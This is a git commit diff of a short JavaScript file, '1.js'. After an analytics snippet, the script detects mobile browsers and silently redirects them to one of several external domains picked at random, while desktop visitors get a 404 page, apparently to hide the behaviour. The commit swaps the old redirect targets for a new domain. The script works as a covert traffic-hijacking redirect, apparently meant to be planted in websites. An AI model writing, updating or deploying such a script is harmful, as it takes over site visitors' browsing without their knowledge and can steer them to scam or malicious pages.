1e3959355654070b27002a11e418f5d977ec0b7c
dnshook <62766196+dnshook@users.noreply.github.com>
2023-06-14 22:11:20 +0800

    Update 1.js

--- 1.js
+++ 1.js
@@ -6,7 +6,8 @@ var _hmt = _hmt || [];
   s.parentNode.insertBefore(hm, s);
 })();
 if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
-	var arr = ["http://18kyty.com", "http://leyu3413.com", "http://4892ky.com"];
+	//var arr = ["http://18kyty.com", "http://leyu3413.com", "http://4892ky.com"];
+	var arr = ["https://1w7c6r.com", "https://1w7c6r.com"];
 	window.location.href = arr[parseInt(Math.random() * arr.length)];
 }else{
 	window.location.href="/404.html";
